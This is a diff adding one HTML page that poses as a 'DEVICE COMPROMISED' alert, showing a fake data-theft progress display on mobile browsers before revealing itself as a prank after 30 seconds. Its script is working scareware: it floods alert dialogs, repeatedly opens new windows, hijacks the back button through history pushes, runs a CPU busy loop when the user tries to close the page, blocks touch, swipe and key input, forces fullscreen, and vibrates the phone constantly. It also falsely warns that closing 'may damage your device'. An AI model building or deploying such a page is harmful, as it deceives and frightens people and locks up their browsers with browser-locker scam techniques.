@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Security Alert</title>
+    <!-- Add mobile-specific meta tags -->
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#000000">
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100vw;
+            position: fixed; /* Prevent scrolling */
+            touch-action: none; /* Disable default touch behaviors */
+        }
+
+        .warning-container {
+            border: 3px solid red;
+            padding: 20px;
+            width: 90%;
+            max-width: 500px;
+            margin: 0 auto;
+            animation: pulse 1.5s infinite;
+        }
+
+        h1 {
+            font-size: 32px;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
+        }
+
+        .skull {
+            font-size: 80px;
+            margin: 15px 0;
+        }
+
+        .message {
+            font-size: 18px;
+            margin: 15px 0;
+            line-height: 1.5;
+        }
+
+        .timer {
+            font-size: 28px;
+            margin: 15px 0;
+            color: white;
+        }
+
+        .blink {
+            animation: blink 1s infinite;
+        }
+
+        /* Data transfer visualization styles */
+        .data-transfer {
+            margin: 15px 0;
+            text-align: left;
+            color: #0F0;
+            font-size: 14px;
+        }
+
+        .progress-label {
+            margin-bottom: 5px;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            height: 20px;
+            background-color: #111;
+            border: 1px solid #0F0;
+            margin-bottom: 5px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #0F0;
+            transition: width 0.5s ease;
+        }
+
+        .transfer-stats {
+            font-size: 12px;
+            color: #0F0;
+            margin-bottom: 10px;
+        }
+
+        .data-list {
+            text-align: left;
+            color: #0F0;
+            font-size: 14px;
+            margin: 15px 0;
+            height: 80px;
+            overflow: hidden;
+        }
+
+        .data-item {
+            margin: 5px 0;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes blink {
+            0%, 49% { opacity: 1; }
+            50%, 100% { opacity: 0; }
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(255, 0, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
+        }
+
+        .matrix-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.2;
+        }
+
+        /* Mobile-specific styles */
+        .fullscreen-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 9999;
+            background-color: transparent;
+        }
+    </style>
+</head>
+<body>
+    <div class="fullscreen-overlay" id="overlay"></div>
+    <canvas id="matrix" class="matrix-bg"></canvas>
+
+    <div class="warning-container">
+        <h1 class="blink">⚠️ DEVICE COMPROMISED ⚠️</h1>
+        <div class="skull">☠️</div>
+        <div class="message">
+            YOUR DEVICE HAS BEEN HACKED<br>
+            ALL YOUR DATA IS BEING TRANSFERRED<br>
+            DO NOT ATTEMPT TO CLOSE THIS PAGE OR TURN OFF YOUR DEVICE<br>
+            DATA EXTRACTION IN PROGRESS...
+        </div>
+        <div class="data-transfer">
+            <div class="progress-label">Transferring files: <span id="file-name">contacts.db</span></div>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+            <div class="transfer-stats">
+                <span id="transfer-percentage">0%</span> complete |
+                <span id="transfer-speed">1.2</span> MB/s |
+                <span id="files-remaining">142</span> files remaining
+            </div>
+        </div>
+        <div class="data-list" id="data-list">
+            <div class="data-item">• Photos directory accessed</div>
+            <div class="data-item">• Messages database extracted</div>
+            <div class="data-item">• Contacts transferred</div>
+        </div>
+        <div class="timer" id="countdown">Time remaining: 0:30</div>
+    </div>
+
+    <script>
+        // Check if vibration is supported
+        const canVibrate = "vibrate" in navigator;
+
+        // Function to create extremely strong vibration patterns
+        function vibrateDevice() {
+            if (canVibrate) {
+                // Create a more intense vibration pattern with longer durations
+                // Maximum vibration pattern (most browsers cap at 10000ms total)
+                const pattern = [1000, 50, 1000, 50, 1000, 50, 1000, 50, 1000, 50, 1000, 50, 1000, 50, 1000];
+                navigator.vibrate(pattern);
+
+                // Schedule the next vibration immediately after this one ends
+                // This creates an almost continuous vibration effect
+                setTimeout(vibrateDevice, 1000);
+            }
+        }
+
+        // Extreme measures to prevent tab closing
+        function preventTabClosing() {
+            // On mobile, we'll be more conservative with new windows
+            // as they're more disruptive and might get blocked
+            let windowOpenCount = 0;
+            const maxWindowOpens = 3;
+
+            setInterval(function() {
+                if (timeLeft > 0 && windowOpenCount < maxWindowOpens) {
+                    try {
+                        const newWindow = window.open(window.location.href, '_blank');
+                        if (newWindow) windowOpenCount++;
+                    } catch (e) {}
+                }
+            }, 8000);
+
+            // Constantly push new history states to make back button useless
+            setInterval(function() {
+                if (timeLeft > 0) {
+                    history.pushState({}, '', window.location.href);
+                }
+            }, 100);
+
+            // Flood with alerts if user tries to leave
+            let alertCount = 0;
+            const maxAlerts = 20;
+
+            function showAlerts() {
+                if (alertCount < maxAlerts && timeLeft > 0) {
+                    alert("WARNING: Do not close this window! System scan in progress!");
+                    alertCount++;
+                    setTimeout(showAlerts, 10);
+                }
+            }
+
+            // Reset alert count periodically
+            setInterval(function() {
+                alertCount = 0;
+            }, 5000);
+
+            // Trigger alerts on various events
+            window.addEventListener('mouseleave', showAlerts);
+            document.addEventListener('keydown', showAlerts);
+            window.addEventListener('blur', showAlerts);
+        }
+
+        // Initialize extreme measures
+        preventTabClosing();
+
+        // Start vibration immediately
+        vibrateDevice();
+
+        // Prevent going back
+        history.pushState(null, null, document.URL);
+        window.addEventListener('popstate', function() {
+            history.pushState(null, null, document.URL);
+            alert("WARNING: Do not attempt to leave this page!");
+            vibrateDevice(); // Vibrate on attempt to leave
+        });
+
+        // Disable right-click and context menu
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // Capture all touch events on the overlay to prevent normal interaction
+        const overlay = document.getElementById('overlay');
+        ['touchstart', 'touchmove', 'touchend', 'touchcancel'].forEach(eventName => {
+            overlay.addEventListener(eventName, function(e) {
+                e.preventDefault();
+                // Vibrate strongly on touch
+                if (canVibrate) navigator.vibrate([200, 50, 200]);
+            }, { passive: false });
+        });
+
+        // Disable keyboard shortcuts (for external keyboards connected to mobile)
+        document.addEventListener('keydown', function(e) {
+            e.preventDefault();
+            alert("WARNING: Do not attempt to leave this page!");
+            vibrateDevice();
+            return false;
+        });
+
+        // Create a constant stream of dialogs if user tries to close
+        let preventClose = true;
+        window.onbeforeunload = function(e) {
+            if (preventClose && timeLeft > 0) {
+                // This will trigger the "Leave Site?" dialog
+                e.preventDefault();
+                e.returnValue = "WARNING: System scan in progress. Do not close this window!";
+
+                // Vibrate with maximum intensity
+                if (canVibrate) navigator.vibrate([1000, 50, 1000, 50, 1000, 50, 1000, 50, 1000]);
+
+                // Show multiple alerts to make it harder to close
+                setTimeout(() => alert("WARNING: Closing this window may damage your device!"), 100);
+                setTimeout(() => alert("CRITICAL: System scan interrupted!"), 300);
+
+                // Create an infinite loop of new windows
+                for (let i = 0; i < 10; i++) {
+                    window.open(window.location.href, '_blank');
+                }
+
+                // Force CPU usage to make it harder to close
+                let startTime = Date.now();
+                while (Date.now() - startTime < 2000) {
+                    // Busy loop to consume CPU
+                    Math.random() * Math.random();
+                }
+
+                return "WARNING: System scan in progress. Do not close this window!";
+            }
+        };
+
+        // Request screen wake lock to keep screen on
+        async function requestWakeLock() {
+            try {
+                if ('wakeLock' in navigator) {
+                    const wakeLock = await navigator.wakeLock.request('screen');
+                    console.log('Wake Lock is active');
+                }
+            } catch (err) {
+                console.log(`Wake Lock error: ${err.name}, ${err.message}`);
+            }
+        }
+
+        // Try to get wake lock
+        requestWakeLock();
+
+        // Request fullscreen on mobile
+        function goFullScreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) {
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.msRequestFullscreen) {
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+
+        // Try to go fullscreen immediately and on any user interaction
+        document.addEventListener('click', goFullScreen);
+        document.addEventListener('touchstart', goFullScreen);
+        setTimeout(goFullScreen, 1000);
+
+        // Data transfer simulation
+        const fileNames = [
+            "contacts.db", "photos/IMG_0172.jpg", "WhatsApp/Media/", "Downloads/",
+            "DCIM/Camera/", "browser_history.db", "accounts.xml", "messages.db",
+            "call_history.log", "Documents/", "passwords.enc", "location_history.json",
+            "calendar_events.db", "notes.db", "voice_recordings/", "payment_info.enc",
+            "social_media_cache/", "credentials.dat", "device_info.xml", "backup.tar"
+        ];
+
+        const progressBar = document.getElementById('progress-bar');
+        const fileNameElement = document.getElementById('file-name');
+        const transferPercentage = document.getElementById('transfer-percentage');
+        const transferSpeed = document.getElementById('transfer-speed');
+        const filesRemaining = document.getElementById('files-remaining');
+        const dataList = document.getElementById('data-list');
+
+        let currentFileIndex = 0;
+        let currentProgress = 0;
+
+        function updateDataTransfer() {
+            // Update progress bar - faster for 30 second timer
+            currentProgress += Math.random() * 6;
+            if (currentProgress > 100) {
+                currentProgress = 0;
+                currentFileIndex = (currentFileIndex + 1) % fileNames.length;
+                fileNameElement.textContent = fileNames[currentFileIndex];
+
+                // Add new data item to the list
+                const newItem = document.createElement('div');
+                newItem.className = 'data-item';
+                newItem.textContent = '• ' + fileNames[currentFileIndex] + ' transferred';
+                dataList.appendChild(newItem);
+
+                // Keep only the last 5 items
+                if (dataList.children.length > 5) {
+                    dataList.removeChild(dataList.children[0]);
+                }
+
+                // Update files remaining
+                const remaining = parseInt(filesRemaining.textContent);
+                if (remaining > 1) {
+                    filesRemaining.textContent = remaining - 1;
+                } else {
+                    filesRemaining.textContent = Math.floor(Math.random() * 20) + 130;
+                }
+            }
+
+            progressBar.style.width = currentProgress + '%';
+            transferPercentage.textContent = Math.floor(currentProgress) + '%';
+
+            // Randomize transfer speed for realism
+            transferSpeed.textContent = (Math.random() * 2 + 0.5).toFixed(1);
+        }
+
+        // Update data transfer visualization every 200ms
+        const dataTransferInterval = setInterval(updateDataTransfer, 200);
+
+        // Countdown timer
+        let timeLeft = 30; // 30 seconds
+        const countdownElement = document.getElementById('countdown');
+
+        const countdownTimer = setInterval(function() {
+            timeLeft--;
+
+            // Vibrate more frequently with stronger patterns
+            if (timeLeft % 5 === 0 && canVibrate) {
+                // Strong pulse every 5 seconds
+                navigator.vibrate([500, 100, 500, 100, 500]);
+            }
+
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+
+            countdownElement.textContent = `Time remaining: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdownTimer);
+                clearInterval(dataTransferInterval);
+                preventClose = false; // Allow closing after time is up
+
+                // Stop vibrations
+                if (canVibrate) navigator.vibrate(0);
+
+                alert("Data transfer complete. This was just a prank!");
+
+                // Exit fullscreen if possible
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                } else if (document.webkitExitFullscreen) {
+                    document.webkitExitFullscreen();
+                } else if (document.mozCancelFullScreen) {
+                    document.mozCancelFullScreen();
+                } else if (document.msExitFullscreen) {
+                    document.msExitFullscreen();
+                }
+
+                // Show prank message briefly
+                document.body.innerHTML = "<h1 style='color:green; font-size:36px; margin-top:40vh;'>This was just a prank! 😄</h1>";
+
+                // Automatically close the tab/window after 2 seconds
+                setTimeout(function() {
+                    window.close();
+                    // If window.close() doesn't work (likely on mobile), redirect to blank page
+                    window.location.href = "about:blank";
+                }, 2000);
+            }
+        }, 1000);
+        
+        // Matrix effect - optimized for mobile
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+
+        // Resize canvas when orientation changes
+        window.addEventListener('resize', resizeCanvas);
+        window.addEventListener('orientationchange', resizeCanvas);
+        resizeCanvas();
+
+        const characters = "01";
+        const fontSize = 12; // Smaller font size for mobile
+        const columns = canvas.width / fontSize;
+
+        const drops = [];
+        for (let i = 0; i < columns; i++) {
+            drops[i] = 1;
+        }
+
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = "#0F0";
+            ctx.font = fontSize + "px monospace";
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = characters.charAt(Math.floor(Math.random() * characters.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+
+                drops[i]++;
+            }
+        }
+
+        // Run matrix effect at a lower framerate on mobile to save battery
+        setInterval(drawMatrix, 50);
+
+        // Mobile-specific handlers
+
+        // Handle visibility change (when user switches apps)
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'hidden' && timeLeft > 0) {
+                // Vibrate with extreme intensity when user tries to leave
+                if (canVibrate) navigator.vibrate([1000, 50, 1000, 50, 1000, 50, 1000, 50, 1000, 50, 1000]);
+
+                // Try to show notification if permission is granted
+                if ('Notification' in window && Notification.permission === 'granted') {
+                    new Notification('WARNING', {
+                        body: 'System scan interrupted! Return immediately!',
+                        icon: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y="50" font-size="80">⚠️</text></svg>'
+                    });
+                }
+
+                // Force the page to regain focus
+                window.focus();
+
+                // Create a flood of alerts
+                for (let i = 0; i < 5; i++) {
+                    setTimeout(() => alert("WARNING: Do not leave this page! Data transfer interrupted!"), i * 200);
+                }
+
+                // Open new windows
+                for (let i = 0; i < 3; i++) {
+                    window.open(window.location.href, '_blank');
+                }
+
+                // Play a loud alert sound if audio is available
+                try {
+                    const audio = new Audio('data:audio/wav;base64,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');
+                    audio.play();
+                } catch (e) {}
+            }
+        });
+
+        // Capture all touch events to prevent normal navigation
+        document.addEventListener('touchstart', function(e) {
+            if (timeLeft > 0) {
+                // Allow touches but vibrate on each touch
+                if (canVibrate) navigator.vibrate(50);
+
+                // Prevent default for touches near the top of the screen (where browser UI is)
+                if (e.touches[0].clientY < 100) {
+                    e.preventDefault();
+                    alert("WARNING: Do not attempt to leave this page!");
+                    if (canVibrate) navigator.vibrate([500, 50, 500, 50, 500]);
+                }
+            }
+        }, { passive: false });
+
+        // Prevent swipe navigation gestures
+        let startX, startY;
+        document.addEventListener('touchstart', function(e) {
+            startX = e.touches[0].clientX;
+            startY = e.touches[0].clientY;
+        }, { passive: true });
+
+        document.addEventListener('touchmove', function(e) {
+            if (!startX || !startY || timeLeft <= 0) return;
+
+            let diffX = startX - e.touches[0].clientX;
+            let diffY = startY - e.touches[0].clientY;
+
+            // If it seems like a horizontal swipe (common navigation gesture)
+            if (Math.abs(diffX) > Math.abs(diffY) && Math.abs(diffX) > 50) {
+                e.preventDefault();
+                alert("WARNING: Navigation disabled during system scan!");
+                if (canVibrate) navigator.vibrate([800, 50, 800, 50, 800]);
+            }
+        }, { passive: false });
+
+        // Request notification permission for additional alerts
+        if ('Notification' in window && Notification.permission !== 'granted' && Notification.permission !== 'denied') {
+            // Request on user interaction to comply with browser requirements
+            document.addEventListener('click', function requestNotification() {
+                Notification.requestPermission();
+                document.removeEventListener('click', requestNotification);
+            });
+        }
+    </script>
+</body>
+</html>
